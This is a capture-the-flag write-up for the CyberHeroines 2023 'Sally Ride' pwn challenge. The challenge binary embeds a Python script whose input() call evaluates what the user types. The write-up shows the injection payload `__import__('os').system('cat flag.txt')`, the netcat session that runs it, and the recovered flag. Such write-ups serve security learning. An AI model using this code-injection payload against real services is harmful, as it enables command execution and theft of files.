# CyberHeroines 2023

## Sally Ride

> [Sally Kristen Ride](https://en.wikipedia.org/wiki/Sally_Ride) (May 26, 1951 – July 23, 2012) was an American astronaut and physicist. Born in Los Angeles, she joined NASA in 1978, and in 1983 became the first American woman and the third woman to fly in space, after cosmonauts Valentina Tereshkova in 1963 and Svetlana Savitskaya in 1982. She was the youngest American astronaut to have flown in space, having done so at the age of 32. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Sally_Ride)
> 
> Chal: I asked ChatGPT to build this binary to honor my hero, the [first American woman](https://www.youtube.com/watch?v=jwu-zSdNiLI) in space, but its broken and I cannot seem to figure out why. Connect to `0.cloud.chals.io 10568` and help me return the flag.
>
>  Author: [TJ](https://www.tjoconnor.org/)
>
> [`chal.bin`](chal.bin)

Tags: _pwn_

## Solution
We are getting a binary for this challenge. Lets see what's going on. The `main` is very short. It uses the [`Python/C API`](https://docs.python.org/3/c-api/index.html) to execute embedded python. 

```c
undefined8 main(void)
{
  logo();
  Py_Initialize();
  PyRun_SimpleStringFlags
            ("def main():\n    superhero_name = input(\"Who is your hero >>> \")\n    print(\"Your hero name is:\", superhero_name)\n\nif __name__ == \"__main__\":\n    main()\n"
             ,0);
  Py_Finalize();
  return 0;
}
```

The embedded python script is also where short. Interestingly with the input prompt we have the possibility to inject python code.

```python
def main():
    superhero_name = input("Who is your hero >>> ")
    print("Your hero name is:", superhero_name)
    
if __name__ == "__main__":
    main()
```

What we can do is to input `__import__('os').system('cat flag.txt')` as superhero name and python will happily execute this code and print the flag out.

```bash
$ nc 0.cloud.chals.io 10568
--------------------------------------------------------------------------------

                             WWWWNNXXXXXXXXXXNNWWW
                        WWNXK0OkkxxxxddddddxxxxkkO0KXNWW
                    WWXK0kxddddddddddddddddddddddddddxk0KXWW
                 WWX0kxddddddddddddddddddddddddddddddddddxk0XWW
               WX0kxddddddddddddddddddddddddddddddddddddddddxk0XW
             WXOxddddddddddddddddddddddddddddddddddddddddddddddxOXW
           WXOxdddddddddddddddddddddddxxxxdddddddddddddddddddddddxOXW
          N0xdddddddddddddddddddxk0KKXXXXXXKK0kxdddddddddddddddddddx0N
        WXkddddddddddddddddddxOKNW            WNKOxddddddddddddddddddkXW
       WKxdddddddddddddddddxOXWW                 WXOxdddddddddddddddddxKW
      W0xdddddddddddddddddkKW        WWWWWW        WKkdddddddddddddddddx0W
     W0xdddddddddddddddddxKW      WX0OkkkkO0XW      WKkdddddddddddddddddx0W
    WKxdddddddddddddddddx0W     WNOxddddddddxON      W0xdddddddddddddddddxKW
   WXkddddddddddddddddddkXWW   WNOddddddddddddON      XkddddddddddddddddddkN
   W0xddddddddddddddddddxO000000OxddddddddddddkXW     Xkddddddddddddddddddx0W
   NkdddddddddddddddddddddddddddddddddddddddddON      XkdddddddddddddddddddON
   XxdddddddddddddddddddddddddddddddddddddddxOXW     W0xdddddddddddddddddddxX
  WKxdddddddddddddddddddddddddddddddddddddk0XW      WXkddddddddddddddddddddxKW
  W0xdddddddddddddddddddddddddddddddddxO0KNW       WKkdddddddddddddddddddddd0W
  W0xddddddddddddddddddddddddddddddddkKW         WXOxddddddddddddddddddddddx0W
  WKxdddddddddddddddddddddddddddddddONW       WNKOxddddddddddddddddddddddddxKW
   XkddddddddddddddddddddddddddddddkXW      WX0kdddddddddddddddddddddddddddkX
   NOdddddddddddddddddddddddddddddd0W      WKkdddddddddddddddddddddddddddddON
   WKxdddddddddddddddddddddddddddddkKKKXXKKKOdddddddddddddddddddddddddddddxKW
    N0xddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddx0N
     NOddddddddddddddddddddddddddddxkkkkkkkkxddddddddddddddddddddddddddddON
     WXkddddddddddddddddddddddddddd0NWWWWWWN0dddddddddddddddddddddddddddkXW
      WXkdddddddddddddddddddddddddd0W      W0ddddddddddddddddddddddddddOXW
       WNOxdddddddddddddddddddddddd0W      W0ddddddddddddddddddddddddxONW
         WKkdddddddddddddddddddddddOXXXXXXXXOdddddddddddddddddddddddkKW
          WXOxddddddddddddddddddddddxxxxxxxxddddddddddddddddddddddxOXW
            WXOxddddddddddddddddddddddddddddddddddddddddddddddddxOXW
              WX0kddddddddddddddddddddddddddddddddddddddddddddk0XW
                WNKOxddddddddddddddddddddddddddddddddddddddxOKNW
                   WNK0kxddddddddddddddddddddddddddddddxk0KNW
                      WWNK0OkxxddddddddddddddddddxxkO0KNWW
                           WWNXKK00OOOOOOOOOO00KKXNWW
                                     WWWWWW

--------------------------------------------------------------------------------
 I would like to be remembered as someone who was not afraid to do what
 she wanted to do, and as someone who took risks along the way in order to
 achieve her goals. - Dr. Sally Ride
--------------------------------------------------------------------------------
Who is your hero >>> __import__('os').system('cat flag.txt')
chctf{u_cant_B_Wh4t_u_caNT_S33}
('Your hero name is:', 0)
```

Flag `chctf{u_cant_B_Wh4t_u_caNT_S33}`